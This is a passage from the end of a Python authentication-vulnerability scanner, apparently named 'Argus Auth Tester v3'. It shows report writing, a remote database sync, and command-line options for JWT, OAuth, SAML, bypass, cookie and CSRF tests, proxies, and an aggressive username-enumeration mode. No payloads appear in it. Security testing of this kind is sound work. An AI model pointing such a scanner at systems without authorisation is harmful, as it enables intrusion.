        json.dumps(confirmed_report, indent=2, ensure_ascii=False) + "\n"
    )

    # Chains report
    (outdir / "auth_chains.json").write_text(
        json.dumps({
            "generated_at": datetime.now(timezone.utc).isoformat(),
            "chains": [c.to_dict() for c in chains],
        }, indent=2, ensure_ascii=False) + "\n"
    )

    # Flat candidates
    cand_lines = [
        f"{f.target}\t{f.vuln_type}\t{f.category}\t{f.severity.value}\t{f.confidence}\t{f.evidence[:160]}"
        for f in deduped
    ]
    (outdir / "auth_candidates.txt").write_text(
        "\n".join(cand_lines) + ("\n" if cand_lines else "")
    )

    # DB sync
    if scan_id is not None and deduped:
        log.info("")
        log.info(f"  Syncing to remote database (scan_id={scan_id})...")
        _self_sync(scan_id, deduped)

    # Console summary
    log.info("")
    log.info("  Outputs :")
    log.info(f"    auth_findings.json           {len(deduped):>5} finding(s)")
    log.info(f"    auth_confirmed.json          {len(confirmed_findings):>5} confirmed (HIGH+)")
    log.info(f"    auth_chains.json             {len(chains):>5} chain(s)")
    log.info(f"    auth_candidates.txt          {len(deduped):>5} candidate(s)")
    log.info("")
    log.info(f"  Severity : CRITICAL={by_sev['CRITICAL']}  HIGH={by_sev['HIGH']}  "
             f"MEDIUM={by_sev['MEDIUM']}  LOW={by_sev['LOW']}  INFO={by_sev['INFO']}")
    if by_cat:
        log.info("  Category : " + " · ".join(
            f"{k}({v})" for k, v in list(by_cat.items())[:8]
        ))
    if confirmed_findings:
        log.info("")
        log.info("  Confirmed findings (HIGH+):")
        for f in confirmed_findings[:10]:
            tag = " [chain]" if f.chain_id else ""
            log.info(f"    [{f.severity.value:<8}] {f.vuln_type:<32} {f.target[:55]}{tag}")
    log.info("")
    log.info(f"  Completed in {elapsed:.1f}s")
    return json_path


def _write_empty(outdir: Path, input_file: Path, start: float) -> Path:
    base_report = {
        "generated_at": datetime.now(timezone.utc).isoformat(),
        "elapsed_seconds": round(time.monotonic() - start, 2),
        "input_file": str(input_file),
        "auth_enabled": bool(_cfg("AUTH_ENABLED", False)),
        "config": {},
        "totals": {"urls_scanned": 0, "total_findings": 0,
                   "critical": 0, "high": 0, "medium": 0, "low": 0, "info": 0,
                   "confirmed": 0},
        "summary": {"by_severity": {}, "by_type": {}, "by_category": {}},
        "findings": [],
    }
    path = outdir / "auth_findings.json"
    path.write_text(json.dumps(base_report, indent=2) + "\n")
    (outdir / "auth_confirmed.json").write_text(json.dumps({
        "generated_at": datetime.now(timezone.utc).isoformat(),
        "input_file": str(input_file),
        "totals": {"confirmed": 0, "critical": 0, "high": 0},
        "findings": [],
    }, indent=2) + "\n")
    (outdir / "auth_chains.json").write_text(json.dumps({
        "generated_at": datetime.now(timezone.utc).isoformat(),
        "chains": [],
    }, indent=2) + "\n")
    (outdir / "auth_candidates.txt").write_text("")
    return path


# ═════════════════════════════════════════════════════════════════════════════
#  STANDALONE
# ═════════════════════════════════════════════════════════════════════════════

if __name__ == "__main__":
    logging.basicConfig(
        level=logging.INFO,
        format="%(message)s",
        handlers=[logging.StreamHandler(sys.stdout)],
    )
    base = Path(__file__).resolve().parent.parent
    default_input = base / "output" / "urls_with_params.txt"
    if not default_input.exists():
        default_input = base / "output" / "live_urls.txt"
    out = base / "output"

    parser = argparse.ArgumentParser(description="Argus Auth Tester v3")
    parser.add_argument("--input", type=Path, default=default_input)
    parser.add_argument("--output", type=Path, default=out)
    parser.add_argument("--scan-id", type=int, default=None)
    parser.add_argument("--rate-limit", type=int, default=None)
    parser.add_argument("--concurrency", type=int, default=None)
    parser.add_argument("--proxies", default=None, help="Comma-separated proxy URLs")
    parser.add_argument("--aggressive", action="store_true",
                        help="Enable rate-limit probing and username enumeration")
    parser.add_argument("--no-jwt", action="store_true")
    parser.add_argument("--no-oauth", action="store_true")
    parser.add_argument("--no-saml", action="store_true")
    parser.add_argument("--no-bypass", action="store_true")
    parser.add_argument("--no-cookies", action="store_true")
    parser.add_argument("--no-csrf", action="store_true")
    args = parser.parse_args()

    proxies = args.proxies.split(",") if args.proxies else None

    try:
        run_auth_tester(
            args.input, args.output,
            rate_limit=args.rate_limit,
            concurrency=args.concurrency,
            proxies=proxies,
            test_jwt=not args.no_jwt,
            test_oauth=not args.no_oauth,
            test_saml=not args.no_saml,
            test_bypass=not args.no_bypass,
            test_cookies=not args.no_cookies,
            test_csrf=not args.no_csrf,
            aggressive=args.aggressive,
            scan_id=args.scan_id,
        )
    except Exception as e:
        log.error(f"failed: {e}")
        import traceback
        log.debug(traceback.format_exc())
        sys.exit(1)
